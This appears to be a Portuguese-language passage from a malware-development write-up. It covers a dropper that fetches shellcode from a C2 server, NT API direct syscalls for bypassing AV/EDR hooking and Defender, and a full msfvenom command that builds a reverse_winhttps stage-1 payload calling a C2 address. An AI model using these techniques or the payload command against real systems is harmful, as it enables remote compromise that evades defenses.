...
2 - Em seguida o socket é iniciado, recebe o ip para se conectar, envia a request que pega o shellcode e joga na função ```RunShellcode```. Essa parte é importante porque aqui o dropper faz a primeira interação com o c2 se conectando numa porta web iniciando o stage 1. 
...
Primeiro temos algumas definições de linking para o compilador (os ```#pragma comment```), em seguida as definições de funções ```Nt``` ```NtAllocateVirtualMemory```, ```NtProtectVirtualMemory```, ```NtCreateThreadEx``` e ```NtWaitForSingleObject``` (para alocar memória, alterar permissões e criar thread), essas são as famosas ```NTAPIs``` ou undocumented/low-level functions e não são usadas para desenvolvimento geral de aplicativos porque são principalmente para uso interno do sistema operacional, sendo importadas direto da dll ```ntdll.dll```.

A ideia de usar essas funções é basicamente implementar a tecnica de ```Direct Syscalls``` que tira a abstração que as funções de high-level tem (como a ```VirtualAlloc```, ```CreateThread``` entre outras) usando um interface mais proxima ao kernel. Essa tecnica é bem comum em malwares que tem o objetivo de bypassar algo que as soluções de av/edr fazem conhecido como ```API Hooking```, mesmo não sendo o foco aqui, vai ajudar no bypass do defender.

- [https://www.crow.rip/nest/mal/dev/inject/syscalls/direct-syscalls](https://www.crow.rip/nest/mal/dev/inject/syscalls/direct-syscalls)
- [https://osintteam.blog/av-edr-evasion-using-direct-system-calls-user-mode-vs-kernel-mode-fad2fdfed01a](https://osintteam.blog/av-edr-evasion-using-direct-system-calls-user-mode-vs-kernel-mode-fad2fdfed01a)
- [https://securitytimes.medium.com/path-to-process-injection-bypass-userland-api-hooking-a8a49ae5def6](https://securitytimes.medium.com/path-to-process-injection-bypass-userland-api-hooking-a8a49ae5def6)
...
```
└─$ msfvenom -p windows/x64/custom/reverse_winhttps LHOST=192.168.0.1 LPORT=8443 EXITFUNC=thread -f raw LURI=pegaai.woff HandlerSSLCert=./https-ca.pem -o stage1.bin
```
